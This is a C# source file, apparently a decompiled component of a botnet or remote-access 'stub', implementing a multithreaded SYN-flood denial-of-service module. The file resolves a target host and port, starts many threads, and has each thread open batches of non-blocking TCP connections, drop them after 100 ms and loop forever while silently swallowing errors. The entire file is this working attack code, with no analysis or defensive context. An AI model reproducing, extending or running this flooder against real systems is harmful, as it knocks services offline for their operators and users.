namespace Stub
{
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Threading;

    internal class SynFlood
    {
        private static ThreadStart[] FloodingJob;
        private static Thread[] FloodingThread;
        public static string Host;
        private static IPEndPoint ipEo;
        public static int Port;
        private static SendSyn[] SynClass;
        public static int SynSockets;
        public static int Threads;

        public static void StartSynFlood()
        {
            try
            {
                ipEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                ipEo = new IPEndPoint(IPAddress.Parse(Host), Port);
            }
            FloodingThread = new Thread[Threads];
            FloodingJob = new ThreadStart[Threads];
            SynClass = new SendSyn[Threads];
            for (int i = 0; i < Threads; i++)
            {
                SynClass[i] = new SendSyn(ipEo, SynSockets);
                FloodingJob[i] = new ThreadStart(SynClass[i].Send);
                FloodingThread[i] = new Thread(FloodingJob[i]);
                FloodingThread[i].Start();
            }
        }

        public static void StopSynFlood()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    FloodingThread[i].Suspend();
                }
                catch
                {
                }
            }
        }

        private class SendSyn
        {
            private IPEndPoint ipEo;
            private Socket[] Sock;
            private int SynSockets;

            public SendSyn(IPEndPoint ipEo, int SynSockets)
            {
                this.ipEo = ipEo;
                this.SynSockets = SynSockets;
            }

            public void OnConnect(IAsyncResult ar)
            {
            }

            public void Send()
            {
                int num;
            Label_0000:
                try
                {
                    this.Sock = new Socket[this.SynSockets];
                    for (num = 0; num < this.SynSockets; num++)
                    {
                        this.Sock[num] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        this.Sock[num].Blocking = false;
                        AsyncCallback callback = new AsyncCallback(this.OnConnect);
                        this.Sock[num].BeginConnect(this.ipEo, callback, this.Sock[num]);
                    }
                    Thread.Sleep(100);
                    for (num = 0; num < this.SynSockets; num++)
                    {
                        if (this.Sock[num].Connected)
                        {
                            this.Sock[num].Disconnect(false);
                        }
                        this.Sock[num].Close();
                        this.Sock[num] = null;
                    }
                    this.Sock = null;
                    goto Label_0000;
                }
                catch
                {
                    for (num = 0; num < this.SynSockets; num++)
                    {
                        try
                        {
                            if (this.Sock[num].Connected)
                            {
                                this.Sock[num].Disconnect(false);
                            }
                            this.Sock[num].Close();
                            this.Sock[num] = null;
                        }
                        catch
                        {
                        }
                    }
                    goto Label_0000;
                }
            }
        }
    }
}

